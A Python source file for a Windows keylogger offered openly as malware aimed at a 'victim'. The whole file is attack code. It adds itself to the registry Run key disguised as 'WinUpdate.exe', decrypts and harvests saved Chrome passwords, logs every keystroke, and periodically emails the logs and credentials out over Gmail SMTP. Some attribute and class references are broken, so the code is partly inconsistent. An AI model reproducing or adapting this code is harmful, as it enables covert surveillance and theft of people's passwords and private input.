#!/usr/bin/env python

import pynput.keyboard
import smtplib
import threading
import subprocess
import os
import sys
import shutil
import platform
import sqlite3
import win32crypt
import re


class MainClass:
    def __init__(self, victim_name, time_interval, email, password):

        try:
            self.persistent()
        except Exception as pererr:
            pererr = 'True'

        self.interval = time_interval
        self.victim_name = victim_name
        self.log = self.victim_name
        self.email = email
        self.password = password
        self.platform_name = str(self.get_sysinfo())

        try:
            self.chromePassword = self.get_chrome()
        except Exception as chrerr:
            self.chromePassword = '\n[ ! ]No chrome yet'

    def persistent(self):
        file_destination = os.environ["appdata"] + "\\WinUpdate.exe"
        if not os.path.exists(file_destination):
            shutil.copyfile(sys.executable, file_destination)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v WinUpdate /t REG_SZ /d "' + file_destination + '"',
                shell=True)

    # get chrome pass
    def get_chrome(self):
        data_path = os.path.expanduser('~' + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login data')
        c = sqlite3.connect(data_path)
        cursor = c.cursor()
        select_statement = 'SELECT origin_url, username_value, password_value FROM Logins'
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        cred = {}
        string = ''

        for url, user_name, pwd in login_data:
            pwd = win32crypt.CryptUnprotectData(pwd)
            cred[url] = (user_name, pwd[1].decode('utf8'))
            if pwd[1]:
                string += '\n\n[+] URL:%s UName: %s Pass:%s \n' % (url, user_name, pwd[1].decode('utf8'))

        return string

    def get_sysinfo(self):
        syst_info = re.search(r"(.ystem=(.+?'))(.+node=(.+?'))(.+version=(.+?'))",
                                        str(platform.uname())).group(0)
        return syst_info

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.delete:
                self.log = self.log + "[DELETE]"
            elif key == key.esc:
                self.log = self.log + "[ESCAPE]"
            elif key == key.ctrl_l:
                self.log = self.log + "[LEFT CTRL]"
            elif key == key.tab:
                self.log = self.log + "[TAB]"
            elif key == key.alt_l:
                self.log = self.log + "[LEFT ALT]"
            elif key == key.alt_r:
                self.log = self.log + "[RIGHT ALT]"
            elif key == key.ctrl_r:
                self.log = self.log + "[RIGHT CTRL]"
            elif key == key.caps_lock:
                self.log = self.log + "[CAPS LOCK]"
            elif key == key.backspace:
                self.log = self.log + "[BACKSPACE]"
            elif key == key.shift_r:
                self.log = self.log + "[RIGHT SHIFT]"
            elif key == key.shift_l:
                self.log = self.log + "[LEFT SHIFT]"
            elif key == key.space:
                self.log = self.log + " "  # namiesto key.spac medzera
            elif key == key.enter:
                self.log = self.log + "\n[Enter] \n"  # enter
            else:
                self.log = self.log + " " + str(key) + " "

    '''timer'''
    def report_timer(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        timer = threading.Timer(self.interval, self.report_timer)
        timer.start()
        self.log = self.victim_name

    '''choose a mail provider (yandex or gmail)'''
    # -- Yandex
    # def send_mail(self, email, password, message):
    #     server = smtplib.SMTP('smtp.yandex.com', 587)
    #     server.ehlo()
    #     server.starttls()
    #     server.login(email, password)
    #     message = "\r\n".join([email, email, "Subject:" + self.kto_to_je, "", self.nameOfPlatform + self.chromePassword + "-->\n" + message])
    #     server.sendmail(email, email, message.encode('utf-8'))
    #     server.quit()

    # -- gmail
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        message = self.nameOfPlatform + self.chromePassword + "\n-->\n" + message
        server.sendmail(email, email, message.encode('utf-8'))
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report_timer()
            keyboard_listener.join()


if __name__ == '__main__':
    try:
        my_keylogger = MyKey.MainClass("'''----Victim name----'''", '''time interval''',
                                       "'''information reciever - mail'''", "'''mail_pass'''")
        my_keylogger.start()
    except Exception:
        ail = "True"
